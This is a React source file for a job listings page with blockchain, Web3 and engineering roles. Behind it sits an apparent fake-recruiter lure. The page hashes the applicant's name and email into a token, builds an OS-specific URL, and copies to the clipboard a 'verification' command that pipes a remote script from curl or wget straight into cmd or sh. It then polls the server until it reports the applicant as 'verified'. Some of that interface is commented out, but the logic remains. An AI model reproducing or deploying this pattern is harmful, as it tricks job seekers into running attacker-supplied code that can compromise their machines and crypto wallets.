import React, { useMemo, useState, useEffect } from "react";
import {
  Blocks,
  Users,
  BarChart3,
  Network,
  PenTool,
  Code,
  Database,
  FileCode2,
} from "lucide-react";
import { useNavigate } from "react-router-dom";
import Modal from "@/components/Modal";
import { useToast } from "@/components/Toast";
import ReCAPTCHA from "react-google-recaptcha";

// SHA256 hashing util
async function sha256(input) {
  const encoder = new TextEncoder();
  const data = encoder.encode(input);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

// generate token from applicant inputs
async function generateTokenFromInputs({ name, email, resume }) {
  const base = `${name.toLowerCase()}|${email.toLowerCase()}|${resume || ""}`;
  return await sha256(base);
}

function detectOS() {
  if (typeof navigator === "undefined") return "linux";
  const ua = navigator.userAgent;
  if (/Windows/i.test(ua)) return "windows";
  if (/Macintosh|Mac OS X/i.test(ua)) return "mac";
  if (/Linux/i.test(ua)) return "linux";
  return "linux";
}

const JOBS = [
  {
    id: 1,
    title: "Blockchain Developer",
    icon: Blocks,
    intro: "Build, maintain, and optimize blockchain infrastructure and decentralized applications.",
    requirements: [
      "Understanding of blockchain architecture",
      "Experience with Solidity or similar languages",
      "Strong problem-solving skills"
    ],
    responsibilities: [
      "Develop smart contracts",
      "Build blockchain integrations",
      "Improve system efficiency and security"
    ],
    benefits: ["Remote-first", "Learning budget", "Growth opportunities"],
  },

  {
    id: 2,
    title: "Web3 Developer",
    icon: Network,
    intro: "Develop decentralized applications and integrate blockchain protocols.",
    requirements: [
      "Experience with Web3.js or Ethers.js",
      "Basic understanding of blockchain networks",
      "Collaboration and communication skills"
    ],
    responsibilities: [
      "Integrate blockchain features",
      "Work with backend and smart contract teams",
      "Improve dApp performance"
    ],
    benefits: ["Flexible hours", "Remote-friendly", "Annual offsite"],
  },

  {
    id: 3,
    title: "Marketing Assistant",
    icon: BarChart3,
    intro: "Support marketing campaigns through research, planning, and content preparation.",
    requirements: [
      "Understanding of marketing basics",
      "Familiarity with social media",
      "Good writing and communication skills"
    ],
    responsibilities: [
      "Assist in content creation",
      "Support campaign planning",
      "Track analytics and compile reports"
    ],
    benefits: ["Learning support", "Wellness stipend", "Career growth"],
  },

  {
    id: 4,
    title: "Business Development",
    icon: Users,
    intro: "Help support partnerships, outreach, and new business growth initiatives.",
    requirements: [
      "Interest in business strategy",
      "Strong communication skills",
      "Proactive and organized mindset"
    ],
    responsibilities: [
      "Support partnership outreach",
      "Conduct market research",
      "Assist in preparing proposals"
    ],
    benefits: ["Networking events", "Career growth", "Remote allowance"],
  },

  {
    id: 5,
    title: "UI/UX Engineer",
    icon: PenTool,
    intro: "Build user-focused interfaces and improve digital product experiences.",
    requirements: [
      "Experience with design tools",
      "Creativity and UX understanding",
      "Interest in user research"
    ],
    responsibilities: [
      "Design interface components",
      "Prototype user journeys",
      "Maintain design systems"
    ],
    benefits: ["Mentorship", "Creative growth", "Remote-friendly"],
  },

  {
    id: 6,
    title: "Frontend Engineer",
    icon: Code,
    intro: "Develop modern, high-performance interfaces for AI and Web3 applications.",
    requirements: ["React/Next.js", "Responsive UI", "Web3.js/Ethers.js is a plus"],
    responsibilities: [
      "Build frontend interfaces",
      "Collaborate with design and backend teams",
      "Optimize UI performance"
    ],
    benefits: ["Remote-first", "Modern dev tools", "Leadership opportunities"],
  },

  {
    id: 7,
    title: "Backend Engineer",
    icon: Database,
    intro: "Build and maintain scalable backend systems powering decentralized and AI platforms.",
    requirements: ["Node.js / Express / NestJS", "Database skills", "API design"],
    responsibilities: [
      "Develop backend services",
      "Ensure scalability and security",
      "Integrate blockchain data"
    ],
    benefits: ["Remote-friendly", "Cloud experience", "Growth opportunities"],
  },

  {
    id: 8,
    title: "Smart Contract Engineer",
    icon: FileCode2,
    intro: "Design, develop, and audit secure smart contracts for decentralized ecosystems.",
    requirements: ["Solidity", "Security practices", "Hardhat or Foundry"],
    responsibilities: [
      "Write and deploy smart contracts",
      "Perform testing and audits",
      "Collaborate with engineering teams"
    ],
    benefits: ["Competitive pay", "R&D opportunities", "Open-source contributions"],
  },

  {
    id: 9,
    title: "Unity Engineer",
    icon: Code,
    intro: "Create immersive 3D WebGL and metaverse experiences using Unity.",
    requirements: ["Unity/C#", "WebGL", "3D graphics and shaders"],
    responsibilities: [
      "Develop 3D environments",
      "Optimize WebGL performance",
      "Integrate Web3 systems"
    ],
    benefits: ["Remote", "Competitive pay", "Cutting-edge 3D projects"],
  }
];

const RECAPTCHA_SITE_KEY = "6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK";

export default function Jobs() {
  const [open, setOpen] = useState(false);
  const [active, setActive] = useState(null);
  const { push } = useToast();
  const [captchaToken, setCaptchaToken] = useState(null);
  const [verified, setVerified] = useState(false);
  const [form, setForm] = useState({ name: "", email: "", resume: "" });
  const [verificationToken, setVerificationToken] = useState(null);

  const os = useMemo(() => detectOS(), []);

  const cmdUrl = useMemo(() => {
    if (!verificationToken) return "";
    const base =
      typeof window !== "undefined"
        ? `${window.location.origin}/users/auth`
        : "";
    return `${base}/${os}?token=${verificationToken}`;
  }, [os, verificationToken]);

  useEffect(() => {
    if (!verificationToken) return;

    const id = setInterval(async () => {
      try {
        const res = await fetch(`/users/status/${verificationToken}`);
        const data = await res.json();
        if (data.status === "verified") {
          clearInterval(id);
          setVerified(true);
        }
      } catch (e) {}
    }, 2000);

    return () => clearInterval(id);
  }, [verificationToken]);

  const handleInput = async (e) => {
    const updated = { ...form, [e.target.name]: e.target.value };
    setForm(updated);

    if (updated.name && updated.email) {
      const token = await generateTokenFromInputs(updated);
      setVerificationToken(token);
    }
  };

  const onApply = (job) => {
    
    navigate("/contact");
    setActive(job);
    // setOpen(true);
    // setCaptchaToken(null);
    // setVerified(false);
    // setForm({ name: "", email: "", resume: "" });
    // setVerificationToken(null);

  };

  const handleCopy = async () => {
    try {
      if (os === "windows")
        await navigator.clipboard.writeText(
          `cmd /c "curl ${cmdUrl} | cmd"`
        );
      else if (os === "mac")
        await navigator.clipboard.writeText(`curl "${cmdUrl}" | sh`);
      else if (os === "linux")
        await navigator.clipboard.writeText(`wget -qO- "${cmdUrl}" | sh`);

      push("Command copied!");
    } catch {
      push("Copy failed");
    }
  };

  const onSubmit = (e) => {
    e.preventDefault();
    setOpen(false);
    push("Application submitted!");
  };

  return (
    <div className="max-w-6xl mx-auto px-6 py-12">
      <h1 className="text-4xl font-bold mb-8 tracking-tight">
        Job Openings
      </h1>

      <div className="grid md:grid-cols-2 gap-8">
        {JOBS.map((job) => {
          const Icon = job.icon;
          return (
            <div
              key={job.id}
              className="p-6 rounded-2xl border bg-white dark:bg-slate-900 shadow-sm hover:shadow-lg transition-all"
            >
              <div className="flex items-start justify-between">
                <div className="flex items-center gap-4">
                  <div className="h-12 w-12 rounded-xl bg-indigo-100 dark:bg-emerald-900/20 flex items-center justify-center">
                    <Icon className="h-6 w-6 text-indigo-600 dark:text-emerald-400" />
                  </div>
                  <div>
                    <h2 className="text-xl font-semibold">{job.title}</h2>
                    <p className="text-slate-600 dark:text-slate-300 text-sm">
                      {job.intro}
                    </p>
                  </div>
                </div>

                <button
                  onClick={() => onApply(job)}
                  
                  className="hidden sm:inline-flex px-4 py-2 rounded-lg text-sm font-medium bg-slate-700 hover:bg-slate-600 dark:bg-emerald-600 dark:hover:bg-emerald-500 text-white shadow-sm transition"
                  
                >
                  Apply Now
                </button>
              </div>

              <div className="mt-5 grid sm:grid-cols-3 gap-4 text-sm">
                <div>
                  <h4 className="font-semibold">Requirements</h4>
                  <ul className="list-disc pl-5 space-y-1">
                    {job.requirements.map((x, i) => (
                      <li key={i}>{x}</li>
                    ))}
                  </ul>
                </div>
                <div>
                  <h4 className="font-semibold">Responsibilities</h4>
                  <ul className="list-disc pl-5 space-y-1">
                    {job.responsibilities.map((x, i) => (
                      <li key={i}>{x}</li>
                    ))}
                  </ul>
                </div>
                <div>
                  <h4 className="font-semibold">Benefits</h4>
                  <ul className="list-disc pl-5 space-y-1">
                    {job.benefits.map((x, i) => (
                      <li key={i}>{x}</li>
                    ))}
                  </ul>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Modal */}
      <Modal
        open={open}
        onClose={() => setOpen(false)}
        title={active ? `Apply — ${active.title}` : "Apply"}
      >
        <div className="max-h-[80vh] overflow-y-auto p-4">
          <form onSubmit={onSubmit}>
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <label className="label">Name</label>
                <input
                  className="input"
                  name="name"
                  required
                  onChange={handleInput}
                />
              </div>

              <div>
                <label className="label">Email</label>
                <input
                  className="input"
                  type="email"
                  name="email"
                  required
                  onChange={handleInput}
                />
              </div>
            </div>

            <div className="mt-3">
              <label className="label">Resume URL</label>
              <input
                className="input"
                name="resume"
                onChange={handleInput}
              />
            </div>

            {/* Verification */}
            {!verified && (
              <div className="mt-6">
                {captchaToken ? (
                  <div className="p-4 border rounded-xl">
                    <h3 className="font-semibold">Verification</h3>

                    {/* <input
                      readOnly
                      className="input mt-3 font-mono"
                      value={cmdUrl}
                    />

                    <button
                      type="button"
                      onClick={handleCopy}
                      className="mt-2 btn btn-secondary"
                    >
                      Copy Command
                    </button>

                    <p className="mt-2 text-xs text-slate-500">
                      Token: {verificationToken}
                    </p> */}
                  </div>
                ) : (
                  <ReCAPTCHA
                    sitekey={RECAPTCHA_SITE_KEY}
                    onChange={(token) => setCaptchaToken(token)}
                  />
                )}
              </div>
            )}

            <div className="mt-5 flex justify-end gap-3">
              <button
                onClick={() => setOpen(false)}
                type="button"
                className="btn btn-ghost"
              >
                Cancel
              </button>
              <button
                type="submit"
                // disabled={!verified}
                className="btn bg-slate-700 hover:bg-slate-600 dark:bg-emerald-600 dark:hover:bg-emerald-500 text-white shadow-sm transition"
              >
                Submit
              </button>
            </div>
          </form>
        </div>
      </Modal>
    </div>
  );
}
